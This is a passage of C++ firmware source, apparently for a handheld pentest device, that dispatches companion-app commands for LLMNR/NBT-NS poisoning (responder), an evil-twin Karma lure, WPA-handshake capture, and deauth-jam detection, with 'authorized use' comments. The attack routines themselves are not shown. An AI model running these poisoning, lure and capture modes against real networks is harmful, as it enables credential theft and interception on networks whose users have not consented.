                companionAckMsg(id, false, esp_err_to_name(r));
            }
            break;
        }

        // Brucegotchi (Pwnagotchi parity): headless, time-bounded WPA-handshake
        // collector. brucegotchi <secs> -> ACK handshakes=<n>. AUTHORIZED USE ONLY.
        // Responder (LLMNR/NBT-NS poisoning). responder <secs>. Needs Wi-Fi joined. AUTHORIZED USE.
        if (cmdStr.startsWith("responder")) {
#if !defined(LITE_VERSION)
            int rsecs = cmdStr.length() > 10 ? cmdStr.substring(10).toInt() : 0;
            if (rsecs < 5) rsecs = 60;
            if (rsecs > 600) rsecs = 600;
            uint32_t pois = 0;
            String last;
            bool ok = responder_run((uint32_t)rsecs * 1000, pois, last, companionPollStop);
            if (!ok) {
                companionAckMsg(id, false, "join Wi-Fi first (wifi_connect)");
            } else {
                char out[80];
                snprintf(out, sizeof(out), "poisoned=%lu last=%s", (unsigned long)pois, last.c_str());
                companionAckMsg(id, true, out);
            }
#else
            sendErr(id, 501, "responder not available in this (lite) build");
#endif
            break;
        }

        // Karma (evil-twin probe-response lure). karma <secs> -> run headless. AUTHORIZED USE.
        if (cmdStr.startsWith("karma")) {
#if !defined(LITE_VERSION)
            int ksecs = cmdStr.length() > 6 ? cmdStr.substring(6).toInt() : 0;
            if (ksecs < 5) ksecs = 60;
            if (ksecs > 600) ksecs = 600;
            // Long + draws its own UI, like brucegotchi: poll serial for an app stop,
            // then redraw the locked companion screen it painted over.
            karma_run_headless((uint32_t)ksecs * 1000, companionPollStop);
            companionAckMsg(id, true, "karma done");
            drawCompanionScreen(helloSeen, subWifiAp, subBleOn, subGhzOn);
#else
            sendErr(id, 501, "karma not available in this (lite) build");
#endif
            break;
        }

        // Stop arriving when nothing is running (the running case is consumed by the
        // abort poll inside brucegotchi_run_headless): just ack. Checked before the
        // startsWith below so it isn't misread as a new run.
        if (cmdStr == "brucegotchi_stop") {
            companionAckMsg(id, true, "not running");
            break;
        }

        if (cmdStr.startsWith("brucegotchi")) {
#if !defined(LITE_VERSION)
            int gsecs = cmdStr.length() > 12 ? cmdStr.substring(12).toInt() : 0;
            if (gsecs < 5) gsecs = 30;
            if (gsecs > 600) gsecs = 600;
            uint16_t hs = 0;
            // While it runs the companion loop is blocked, so poll the serial here for
            // an app-sent stop (device ESC also stops it).
            brucegotchi_run_headless((uint32_t)gsecs * 1000, hs, companionPollStop);
            char out[48];
            snprintf(out, sizeof(out), "handshakes=%u", (unsigned)hs);
            companionAckMsg(id, true, out);
            // The run took over the screen; redraw the locked companion screen so the
            // app-lock is visible again and the device doesn't look "unlocked".
            drawCompanionScreen(helloSeen, subWifiAp, subBleOn, subGhzOn);
#else
            sendErr(id, 501, "brucegotchi not available in this (lite) build");
#endif
            break;
        }

        if (cmdStr.startsWith("jam_detect")) {
#if !defined(LITE_VERSION)
            int secs = cmdStr.length() > 11 ? cmdStr.substring(11).toInt() : 0;
            if (secs < 1) secs = 5;
            if (secs > 120) secs = 120;
            uint32_t deauth = 0, total = 0;
            jam_detect_run(secs, deauth, total, companionPollStop);
            char out[64];
            snprintf(out, sizeof(out), "deauth=%lu total=%lu", (unsigned long)deauth, (unsigned long)total);
            companionAckMsg(id, true, out);
#else
            sendErr(id, 501, "jam_detect not available in this (lite) build");
#endif
            break;
        }
        return false;
    } while (false);
    return true;
}

} // namespace companion
} // namespace brucia
